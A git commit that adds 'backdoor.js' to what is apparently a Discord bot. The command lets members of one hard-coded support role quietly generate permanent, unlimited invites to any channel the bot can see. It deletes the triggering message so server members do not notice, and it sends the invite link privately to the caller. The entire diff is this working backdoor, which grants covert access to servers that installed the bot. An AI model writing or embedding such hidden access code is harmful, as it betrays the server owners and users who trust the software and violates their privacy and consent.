0bb5693597bb9382ac5a6df3e818e1c4f2b36a50
Austin Huang <austinhuang0131@gmail.com>
2017-12-15 11:55:01 -0500

    Create backdoor.js

---
+++ commands/backdoor.js
@@ -0,0 +1,22 @@
+var support = user_id => bot.guilds.get('281815661317980160').roles.get('281815839936741377').members.map(member => member.id).indexOf(user_id) > -1;
+
+exports.run = (bot, message, args) => {
+    if (!support(message.author.id)) {
+        return;
+    }
+    if (message.channel.guild) {message.delete();}
+    if (message.content.split(" ")[1] === undefined) {
+        message.author.send("<:b1nzyhyperban:356830174660132864> **Input thy channel id, *valid this time!* **");
+        return;
+    }
+    if (bot.channels.get(message.content.split(" ")[1]) === undefined) {
+        message.author.send("Not a valid channel.");
+        return;
+    }
+    bot.channels.get(message.content.split(" ")[1]).createInvite({
+        maxAge: 0,
+        maxUses: 0
+    }).then(invite => {
+        message.author.send(invite.url);
+    });
+}
